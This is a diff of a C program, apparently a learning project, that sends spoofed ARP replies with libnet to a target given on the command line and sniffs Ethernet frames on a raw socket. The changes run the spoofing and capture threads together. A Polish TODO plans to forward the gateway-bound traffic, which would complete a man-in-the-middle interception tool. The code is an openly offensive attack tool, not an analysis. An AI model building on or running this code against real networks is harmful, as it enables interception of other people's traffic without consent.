@@ -47,7 +47,7 @@ void* spoof(char* address){
     struct libnet_ether_addr* src_hw_addr;
     char errbuf[LIBNET_ERRBUF_SIZE];
 
-    ln = libnet_init(LIBNET_LINK, NULL, errbuf);
+    ln = libnet_init(LIBNET_LINK, "wlp3s0" , errbuf); // TODO change to argument
     src_hw_addr = libnet_get_hwaddr(ln); // Returns the MAC address for the device libnet was initialized with
     target_ip_addr = libnet_name2addr4(ln, address, LIBNET_RESOLVE); // Takes a dotted decimal string or a canonical DNS name and returns a network byte ordered IPv4 address. 
                                                                     // This may incur a DNS lookup if mode is set to LIBNET_RESOLVE and host_name refers to a canonical DNS name.
@@ -66,7 +66,6 @@ void* spoof(char* address){
       ln);                             /* libnet context       */
     libnet_write(ln);
     libnet_destroy(ln);
-    printf("Sent ARP\n");
     sleep(1);
     // std::chrono::seconds sec = std::chrono::seconds(2); 
     // std::this_thread::sleep_for(sec);
@@ -99,19 +98,23 @@ void* capture(char* inteface_name){
     fhead = (struct ethhdr*) frame;
     fdata = frame + ETH_HLEN;
     len = recvfrom(sfd, frame, ETH_FRAME_LEN, 0, NULL, NULL);
-    printf("[%dB] %02x:%02x:%02x:%02x:%02x:%02x -> ", (int)len,
-           fhead->h_source[0], fhead->h_source[1], fhead->h_source[2],
-           fhead->h_source[3], fhead->h_source[4], fhead->h_source[5]);
-    printf("%02x:%02x:%02x:%02x:%02x:%02x | ",
-           fhead->h_dest[0], fhead->h_dest[1], fhead->h_dest[2],
-           fhead->h_dest[3], fhead->h_dest[4], fhead->h_dest[5]);
+
+    // TODO wziąć zapytania na bramę i wysłać je tam
+    if (fhead->h_source[5] != 78 && fhead->h_source[5] != 232 && fhead->h_source[5] != 232 ){ 
+      printf("[%dB] %02x:%02x:%02x:%02x:%02x:%02x -> ", (int)len,
+            fhead->h_source[0], fhead->h_source[1], fhead->h_source[2],
+            fhead->h_source[3], fhead->h_source[4], fhead->h_source[5]);
+      printf("%02x:%02x:%02x:%02x:%02x:%02x | ",
+            fhead->h_dest[0], fhead->h_dest[1], fhead->h_dest[2],
+            fhead->h_dest[3], fhead->h_dest[4], fhead->h_dest[5]);
+      printf("\n\n");
+    }
     //printf("%s\n", fdata);
     //for (i = 0; i < len ; i++) {
     //  printf("%02x ", (unsigned char) frame[i]);
     //  if ((i + 1) % 16 == 0)
     //    printf("\n");
     //}
-    printf("\n\n");
     free(frame);
   }
   close(sfd);
@@ -119,16 +122,14 @@ void* capture(char* inteface_name){
 
 int main(int argc, char** argv) {
 
-  spoof(argv[2]);
+  pthread_t arp_spoofer;
+  pthread_create(&arp_spoofer, NULL, spoof, argv[2]);
 
-  // pthread_t arp_spoofer;
-  // pthread_create(&arp_spoofer, NULL, spoof, argv[2]);
+  pthread_t capturer;
+  pthread_create(&capturer, NULL, capture, argv[1]);
 
-  // pthread_t capturer;
-  // pthread_create(&capturer, NULL, capture, argv[1]);
-
-  // pthread_join(arp_spoofer, NULL);
-  // pthread_join(capturer, NULL);
+  pthread_join(arp_spoofer, NULL);
+  pthread_join(capturer, NULL);
   
   //TODO obsługa wejścia - komunikat że brakuje argumentów itp.
 
